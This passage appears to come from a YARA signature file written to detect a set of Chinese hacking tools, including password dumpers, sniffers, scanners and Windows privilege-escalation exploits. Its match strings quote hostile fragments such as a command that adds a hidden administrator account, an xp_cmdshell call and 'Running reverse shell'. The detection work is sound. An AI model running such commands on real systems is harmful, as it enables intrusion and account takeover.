{\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file xsniff.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"d61d7329ac74f66245a92c4505a327c85875c577\"\n\tstrings:\n\t\t$s0 = \"xsiff.exe -pass -hide -log pass.log\" fullword ascii\n\t\t$s1 = \"HOST: %s USER: %s, PASS: %s\" fullword ascii\n\t\t$s2 = \"xsiff.exe -tcp -udp -asc -addr 192.168.1.1\" fullword ascii\n\t\t$s10 = \"Code by glacier <glacier@xfocus.org>\" fullword ascii\n\t\t$s11 = \"%-5s%s->%s Bytes=%d TTL=%d Type: %d,%d ID=%d SEQ=%d\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 220KB and 2 of them\n}\n\nrule MSSqlPass {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file MSSqlPass.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"172b4e31ed15d1275ac07f3acbf499daf9a055d7\"\n\tstrings:\n\t\t$s0 = \"Reveals the passwords stored in the Registry by Enterprise Manager of SQL Server\" wide\n\t\t$s1 = \"empv.exe\" fullword wide\n\t\t$s2 = \"Enterprise Manager PassView\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 120KB and all of them\n}\n\nrule WSockExpert {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file WSockExpert.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"2962bf7b0883ceda5e14b8dad86742f95b50f7bf\"\n\tstrings:\n\t\t$s1 = \"OpenProcessCmdExecute!\" fullword ascii\n\t\t$s2 = \"http://www.hackp.com\" fullword ascii\n\t\t$s3 = \"'%s' is not a valid time!'%s' is not a valid date and time\" fullword wide\n\t\t$s4 = \"SaveSelectedFilterCmdExecute\" fullword ascii\n\t\t$s5 = \"PasswordChar@\" fullword ascii\n\t\t$s6 = \"WSockHook.DLL\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 2500KB and 4 of them\n}\n\nrule Ms_Viru_racle {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file racle.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"13116078fff5c87b56179c5438f008caf6c98ecb\"\n\tstrings:\n\t\t$s0 = \"PsInitialSystemProcess @%p\" fullword ascii\n\t\t$s1 = \"PsLookupProcessByProcessId(%u) Failed\" fullword ascii\n\t\t$s2 = \"PsLookupProcessByProcessId(%u) => %p\" fullword ascii\n\t\t$s3 = \"FirstStage() Loaded, CurrentThread @%p Stack %p - %p\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 210KB and all of them\n}\n\nrule lamescan3 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file lamescan3.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"3130eefb79650dab2e323328b905e4d5d3a1d2f0\"\n\tstrings:\n\t\t$s1 = \"dic\\\\loginlist.txt\" fullword ascii\n\t\t$s2 = \"Radmin.exe\" fullword ascii\n\t\t$s3 = \"lamescan3.pdf!\" fullword ascii\n\t\t$s4 = \"dic\\\\passlist.txt\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3740KB and all of them\n}\n\nrule CN_Tools_pc {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file pc.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5cf8caba170ec461c44394f4058669d225a94285\"\n\tstrings:\n\t\t$s0 = \"\\\\svchost.exe\" fullword ascii\n\t\t$s2 = \"%s%08x.001\" fullword ascii\n\t\t$s3 = \"Qy001Service\" fullword ascii\n\t\t$s4 = \"/.MIKY\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule Dos_Down64 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Down64.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"43e455e43b49b953e17a5b885ffdcdf8b6b23226\"\n\tstrings:\n\t\t$s1 = \"C:\\\\Windows\\\\Temp\\\\Down.txt\" fullword wide\n\t\t$s2 = \"C:\\\\Windows\\\\Temp\\\\Cmd.txt\" fullword wide\n\t\t$s3 = \"C:\\\\Windows\\\\Temp\\\\\" fullword wide\n\t\t$s4 = \"ProcessXElement\" fullword ascii\n\t\t$s8 = \"down.exe\" fullword wide\n\t\t$s20 = \"set_Timer1\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 150KB and all of them\n}\n\nrule epathobj_exp32 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file epathobj_exp32.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ed86ff44bddcfdd630ade8ced39b4559316195ba\"\n\tstrings:\n\t\t$s0 = \"Watchdog thread %d waiting on Mutex\" fullword ascii\n\t\t$s1 = \"Exploit ok run command\" fullword ascii\n\t\t$s2 = \"\\\\epathobj_exp\\\\Release\\\\epathobj_exp.pdb\" fullword ascii\n\t\t$s3 = \"Alllocated userspace PATHRECORD () %p\" fullword ascii\n\t\t$s4 = \"Mutex object did not timeout, list not patched\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 270KB and all of them\n}\n\nrule Tools_unknown {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file unknown.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"4be8270c4faa1827177e2310a00af2d5bcd2a59f\"\n\tstrings:\n\t\t$s1 = \"No data to read.$Can not bind in port range (%d - %d)\" fullword wide\n\t\t$s2 = \"GET /ok.asp?id=1__sql__ HTTP/1.1\" fullword ascii\n\t\t$s3 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii /* PEStudio Blacklist: agent */\n\t\t$s4 = \"Failed to clear tab control Failed to delete tab at index %d\\\"Failed to retrieve\" wide\n\t\t$s5 = \"Host: 127.0.0.1\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 2500KB and 4 of them\n}\n\nrule PLUGIN_AJunk {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file AJunk.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"eb430fcfe6d13b14ff6baa4b3f59817c0facec00\"\n\tstrings:\n\t\t$s1 = \"AJunk.dll\" fullword ascii\n\t\t$s2 = \"AJunk.DLL\" fullword wide\n\t\t$s3 = \"AJunk Dynamic Link Library\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 560KB and all of them\n}\n\nrule IISPutScanner {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file IISPutScanner.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"9869c70d6a9ec2312c749aa17d4da362fa6e2592\"\n\tstrings:\n\t\t$s2 = \"KERNEL32.DLL\" fullword ascii\n\t\t$s3 = \"ADVAPI32.DLL\" fullword ascii\n\t\t$s4 = \"VERSION.DLL\" fullword ascii\n\t\t$s5 = \"WSOCK32.DLL\" fullword ascii\n\t\t$s6 = \"COMCTL32.DLL\" fullword ascii\n\t\t$s7 = \"GDI32.DLL\" fullword ascii\n\t\t$s8 = \"SHELL32.DLL\" fullword ascii\n\t\t$s9 = \"USER32.DLL\" fullword ascii\n\t\t$s10 = \"OLEAUT32.DLL\" fullword ascii\n\t\t$s11 = \"LoadLibraryA\" fullword ascii\n\t\t$s12 = \"GetProcAddress\" fullword ascii\n\t\t$s13 = \"VirtualProtect\" fullword ascii\n\t\t$s14 = \"VirtualAlloc\" fullword ascii\n\t\t$s15 = \"VirtualFree\" fullword ascii\n\t\t$s16 = \"ExitProcess\" fullword ascii\n\t\t$s17 = \"RegCloseKey\" fullword ascii\n\t\t$s18 = \"GetFileVersionInfoA\" fullword ascii\n\t\t$s19 = \"ImageList_Add\" fullword ascii\n\t\t$s20 = \"BitBlt\" fullword ascii\n\t\t$s21 = \"ShellExecuteA\" fullword ascii\n\t\t$s22 = \"ActivateKeyboardLayout\" fullword ascii\n\t\t$s23 = \"BBABORT\" fullword wide\n\t\t$s25 = \"BBCANCEL\" fullword wide\n\t\t$s26 = \"BBCLOSE\" fullword wide\n\t\t$s27 = \"BBHELP\" fullword wide\n\t\t$s28 = \"BBIGNORE\" fullword wide\n\t\t$s29 = \"PREVIEWGLYPH\" fullword wide\n\t\t$s30 = \"DLGTEMPLATE\" fullword wide\n\t\t$s31 = \"TABOUTBOX\" fullword wide\n\t\t$s32 = \"TFORM1\" fullword wide\n\t\t$s33 = \"MAINICON\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 500KB and filesize > 350KB and all of them\n}\n\nrule IDTools_For_WinXP_IdtTool_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file IdtTool.sys\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"07feb31dd21d6f97614118b8a0adf231f8541a67\"\n\tstrings:\n\t\t$s0 = \"\\\\Device\\\\devIdtTool\" fullword wide\n\t\t$s1 = \"IoDeleteSymbolicLink\" fullword ascii  /* Goodware String - occured 467 times */\n\t\t$s3 = \"IoDeleteDevice\" fullword ascii  /* Goodware String - occured 993 times */\n\t\t$s6 = \"IoCreateSymbolicLink\" fullword ascii /* Goodware String - occured 467 times */\n\t\t$s7 = \"IoCreateDevice\" fullword ascii /* Goodware String - occured 988 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 7KB and all of them\n}\n\nrule hkmjjiis6 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hkmjjiis6.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"4cbc6344c6712fa819683a4bd7b53f78ea4047d7\"\n\tstrings:\n\t\t$s1 = \"comspec\" fullword ascii\n\t\t$s2 = \"user32.dlly\" ascii\n\t\t$s3 = \"runtime error\" ascii\n\t\t$s4 = \"WinSta0\\\\Defau\" ascii\n\t\t$s5 = \"AppIDFlags\" fullword ascii\n\t\t$s6 = \"GetLag\" fullword ascii\n\t\t$s7 = \"* FROM IIsWebInfo\" ascii\n\t\t$s8 = \"wmiprvse.exe\" ascii\n\t\t$s9 = \"LookupAcc\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 70KB and all of them\n}\n\nrule Dos_lcx {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file lcx.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b6ad5dd13592160d9f052bb47b0d6a87b80a406d\"\n\tstrings:\n\t\t$s0 = \"c:\\\\Users\\\\careful_snow\\\\\" ascii\n\t\t$s1 = \"Desktop\\\\Htran\\\\Release\\\\Htran.pdb\" ascii\n\t\t$s3 = \"[SERVER]connection to %s:%d error\" fullword ascii\n\t\t$s4 = \"-tran  <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n\t\t$s6 = \"=========== Code by lion & bkbll, Welcome to [url]http://www.cnhonker.com[/url] \" ascii\n\t\t$s7 = \"[-] There is a error...Create a new connection.\" fullword ascii\n\t\t$s8 = \"[+] Accept a Client on port %d from %s\" fullword ascii\n\t\t$s11 = \"-slave  <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n\t\t$s13 = \"[+] Make a Connection to %s:%d....\" fullword ascii\n\t\t$s16 = \"-listen <ConnectPort> <TransmitPort>\" fullword ascii\n\t\t$s17 = \"[+] Waiting another Client on port:%d....\" fullword ascii\n\t\t$s18 = \"[+] Accept a Client on port %d from %s ......\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule x_way2_5_X_way {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file X-way.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"8ba8530fbda3e8342e8d4feabbf98c66a322dac6\"\n\tstrings:\n\t\t$s0 = \"TTFTPSERVERFRM\" fullword wide\n\t\t$s1 = \"TPORTSCANSETFRM\" fullword wide\n\t\t$s2 = \"TIISSHELLFRM\" fullword wide\n\t\t$s3 = \"TADVSCANSETFRM\" fullword wide\n\t\t$s4 = \"ntwdblib.dll\" fullword ascii\n\t\t$s5 = \"TSNIFFERFRM\" fullword wide\n\t\t$s6 = \"TCRACKSETFRM\" fullword wide\n\t\t$s7 = \"TCRACKFRM\" fullword wide\n\t\t$s8 = \"dbnextrow\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and 5 of them\n}\n\nrule tools_Sqlcmd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Sqlcmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"99d56476e539750c599f76391d717c51c4955a33\"\n\tstrings:\n\t\t$s0 = \"[Usage]:  %s <HostName|IP> <UserName> <Password>\" fullword ascii\n\t\t$s1 = \"=============By uhhuhy(Feb 18,2003) - http://www.cnhonker.net=============\" fullword ascii /* PEStudio Blacklist: os */\n\t\t$s4 = \"Cool! Connected to SQL server on %s successfully!\" fullword ascii\n\t\t$s5 = \"EXEC master..xp_cmdshell \\\"%s\\\"\" fullword ascii\n\t\t$s6 = \"=======================Sqlcmd v0.21 For HScan v1.20=======================\" fullword ascii\n\t\t$s10 = \"Error,exit!\" fullword ascii\n\t\t$s11 = \"Sqlcmd>\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 40KB and 3 of them\n}\n\nrule Sword1_5 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Sword1.5.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"96ee5c98e982aa8ed92cb4cedb85c7fda873740f\"\n\tstrings:\n\t\t$s3 = \"http://www.ip138.com/ip2city.asp\" fullword wide\n\t\t$s4 = \"http://www.md5decrypter.co.uk/feed/api.aspx?\" fullword wide\n\t\t$s6 = \"ListBox_Command\" fullword wide\n\t\t$s13 = \"md=7fef6171469e80d32c0559f88b377245&submit=MD5+Crack\" fullword wide\n\t\t$s18 = \"\\\\Set.ini\" fullword wide\n\t\t$s19 = \"OpenFileDialog1\" fullword wide\n\t\t$s20 = \" (*.txt)|*.txt\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 400KB and 4 of them\n}\n\nrule Tools_scan {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file scan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"c580a0cc41997e840d2c0f83962e7f8b636a5a13\"\n\tstrings:\n\t\t$s2 = \"Shanlu Studio\" fullword wide\n\t\t$s3 = \"_AutoAttackMain\" fullword ascii\n\t\t$s4 = \"_frmIpToAddr\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule Dos_c {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file c.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"3deb6bd52fdac6d5a3e9a91c585d67820ab4df78\"\n\tstrings:\n\t\t$s0 = \"!Win32 .EXE.\" fullword ascii\n\t\t$s1 = \".MPRESS1\" fullword ascii\n\t\t$s2 = \".MPRESS2\" fullword ascii\n\t\t$s3 = \"XOLEHLP.dll\" fullword ascii\n\t\t$s4 = \"</body></html>\" fullword ascii\n\t\t$s8 = \"DtcGetTransactionManagerExA\" fullword ascii  /* Goodware String - occured 12 times */\n\t\t$s9 = \"GetUserNameA\" fullword ascii  /* Goodware String - occured 305 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule arpsniffer {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file arpsniffer.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"7d8753f56fc48413fc68102cff34b6583cb0066c\"\n\tstrings:\n\t\t$s1 = \"SHELL\" ascii\n\t\t$s2 = \"PacketSendPacket\" fullword ascii\n\t\t$s3 = \"ArpSniff\" ascii\n\t\t$s4 = \"pcap_loop\" fullword ascii  /* Goodware String - occured 3 times */\n\t\t$s5 = \"packet.dll\" fullword ascii  /* Goodware String - occured 4 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 120KB and all of them\n}\n\nrule pw_inspector_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file pw-inspector.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"e0a1117ee4a29bb4cf43e3a80fb9eaa63bb377bf\"\n\tstrings:\n\t\t$s1 = \"Use for hacking: trim your dictionary file to the pw requirements of the target.\" fullword ascii\n\t\t$s2 = \"Syntax: %s [-i FILE] [-o FILE] [-m MINLEN] [-M MAXLEN] [-c MINSETS] -l -u -n -p \" ascii\n\t\t$s3 = \"PW-Inspector\" fullword ascii\n\t\t$s4 = \"i:o:m:M:c:lunps\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule datPcShare {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file datPcShare.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"87acb649ab0d33c62e27ea83241caa43144fc1c4\"\n\tstrings:\n\t\t$s1 = \"PcShare.EXE\" fullword wide\n\t\t$s2 = \"MZKERNEL32.DLL\" fullword ascii\n\t\t$s3 = \"PcShare\" fullword wide\n\t\t$s4 = \"QQ:4564405\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule Tools_xport {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file xport.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"9584de562e7f8185f721e94ee3cceac60db26dda\"\n\tstrings:\n\t\t$s1 = \"Match operate system failed, 0x%00004X:%u:%d(Window:TTL:DF)\" fullword ascii\n\t\t$s2 = \"Example: xport www.xxx.com 80 -m syn\" fullword ascii\n\t\t$s3 = \"%s - command line port scanner\" fullword ascii\n\t\t$s4 = \"xport 192.168.1.1 1-1024 -t 200 -v\" fullword ascii\n\t\t$s5 = \"Usage: xport <Host> <Ports Scope> [Options]\" fullword ascii\n\t\t$s6 = \".\\\\port.ini\" fullword ascii\n\t\t$s7 = \"Port scan complete, total %d port, %d port is opened, use %d ms.\" fullword ascii\n\t\t$s8 = \"Code by glacier <glacier@xfocus.org>\" fullword ascii\n\t\t$s9 = \"http://www.xfocus.org\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule Pc_xai {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file xai.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"f285a59fd931ce137c08bd1f0dae858cc2486491\"\n\tstrings:\n\t\t$s1 = \"Powered by CoolDiyer @ C.Rufus Security Team 05/19/2008  http://www.xcodez.com/\" fullword wide\n\t\t$s2 = \"%SystemRoot%\\\\System32\\\\\" fullword ascii\n\t\t$s3 = \"%APPDATA%\\\\\" fullword ascii\n\t\t$s4 = \"---- C.Rufus Security Team ----\" fullword wide\n\t\t$s5 = \"www.snzzkz.com\" fullword wide\n\t\t$s6 = \"%CommonProgramFiles%\\\\\" fullword ascii\n\t\t$s7 = \"GetRand.dll\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule Radmin_Hash {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Radmin_Hash.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"be407bd5bf5bcd51d38d1308e17a1731cd52f66b\"\n\tstrings:\n\t\t$s1 = \"<description>IEBars</description>\" fullword ascii\n\t\t$s2 = \"PECompact2\" fullword ascii\n\t\t$s3 = \"Radmin, Remote Administrator\" fullword wide\n\t\t$s4 = \"Radmin 3.0 Hash \" fullword wide\n\t\t$s5 = \"HASH1.0\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 600KB and all of them\n}\n\nrule OSEditor {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file OSEditor.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"6773c3c6575cf9cfedbb772f3476bb999d09403d\"\n\tstrings:\n\t\t$s1 = \"OSEditor.exe\" fullword wide\n\t\t$s2 = \"netsafe\" wide\n\t\t$s3 = \"OSC Editor\" fullword wide\n\t\t$s4 = \"GIF89\" ascii\n\t\t$s5 = \"Unlock\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule GoodToolset_ms11011 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms11011.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5ad7a4962acbb6b0e3b73d77385eb91feb88b386\"\n\tstrings:\n\t\t$s0 = \"\\\\i386\\\\Hello.pdb\" ascii\n\t\t$s1 = \"OS not supported.\" fullword ascii\n\t\t$s3 = \"Not supported.\" fullword wide  /* Goodware String - occured 3 times */\n\t\t$s4 = \"SystemDefaultEUDCFont\" fullword wide  /* Goodware String - occured 18 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule FreeVersion_release {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file release.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"f42e4b5748e92f7a450eb49fc89d6859f4afcebb\"\n\tstrings:\n\t\t$s1 = \"-->Got WMI process Pid: %d \" ascii\n\t\t$s2 = \"This exploit will execute \\\"net user \" ascii\n\t\t$s3 = \"net user temp 123456 /add & net localgroup administrators temp /add\" fullword ascii\n\t\t$s4 = \"Running reverse shell\" ascii\n\t\t$s5 = \"wmiprvse.exe\" fullword ascii\n\t\t$s6 = \"SELECT * FROM IIsWebInfo\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 3 of them\n}\n\nrule churrasco {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file churrasco.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"a8d4c177948a8e60d63de9d0ed948c50d0151364\"\n\tstrings:\n\t\t$s1 = \"Done, command should have ran as SYSTEM!\" ascii\n\t\t$s2 = \"Running command with SYSTEM Token...\" ascii\n\t\t$s3 = \"Thread impersonating, got NETWORK SERVICE Token: 0x%x\" ascii\n\t\t$s4 = \"Found SYSTEM token 0x%x\" ascii\n\t\t$s5 = \"Thread not impersonating, looking for another thread...\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 150KB and 2 of them\n}\nrule x64_KiwiCmd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file KiwiCmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"569ca4ff1a5ea537aefac4a04a2c588c566c6d86\"\n\tstrings:\n\t\t$s1 = \"Process Ok, Memory Ok, resuming process :)\" fullword wide\n\t\t$s2 = \"Kiwi Cmd no-gpo\" fullword wide\n\t\t$s3 = \"KiwiAndCMD\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 400KB and 2 of them\n}\n\nrule sql1433_SQL {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file SQL.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"025e87deadd1c50b1021c26cb67b76b476fafd64\"\n\tstrings:\n\t\t/* WIDE: ProductName 1433 */\n\t\t$s0 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 31 00 34 00 33 00 33 }\n\t\t/* WIDE: ProductVersion 1,4,3,3 */\n\t\t$s1 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 31 00 2C 00 34 00 2C 00 33 00 2C 00 33 }\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 90KB and all of them\n}\n\nrule CookieTools2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file CookieTools2.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"cb67797f229fdb92360319e01277e1345305eb82\"\n\tstrings:\n\t\t$s1 = \"www.gxgl.com&www.gxgl.net\" fullword wide\n\t\t$s2 = \"ip.asp?IP=\" fullword ascii\n\t\t$s3 = \"MSIE 5.5;\" fullword ascii\n\t\t$s4 = \"SOFTWARE\\\\Borland\\\\\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 700KB and all of them\n}\n\nrule cyclotron {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file cyclotron.sys\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5b63473b6dc1e5942bf07c52c31ba28f2702b246\"\n\tstrings:\n\t\t$s1 = \"\\\\Device\\\\IDTProt\" fullword wide\n\t\t$s2 = \"IoDeleteSymbolicLink\" fullword ascii  /* Goodware String - occured 467 times */\n\t\t$s3 = \"\\\\??\\\\slIDTProt\" fullword wide\n\t\t$s4 = \"IoDeleteDevice\" fullword ascii  /* Goodware String - occured 993 times */\n\t\t$s5 = \"IoCreateSymbolicLink\" fullword ascii /* Goodware String - occured 467 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3KB and all of them\n}\n\nrule xscan_gui {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file xscan_gui.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"a9e900510396192eb2ba4fb7b0ef786513f9b5ab\"\n\tstrings:\n\t\t$s1 = \"%s -mutex %s -host %s -index %d -config \\\"%s\\\"\" fullword ascii\n\t\t$s2 = \"www.target.com\" fullword ascii\n\t\t$s3 = \"%s\\\\scripts\\\\desc\\\\%s.desc\" fullword ascii\n\t\t$s4 = \"%c Active/Maximum host thread: %d/%d, Current/Maximum thread: %d/%d, Time(s): %l\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule CN_Tools_hscan {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hscan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"17a743e40790985ececf5c66eaad2a1f8c4cffe8\"\n\tstrings:\n\t\t$s1 = \"%s -f hosts.txt -port -ipc -pop -max 300,20 -time 10000\" fullword ascii\n\t\t$s2 = \"%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,20\" fullword ascii\n\t\t$s3 = \"%s -h www.target.com -all\" fullword ascii\n\t\t$s4 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n\t\t$s5 = 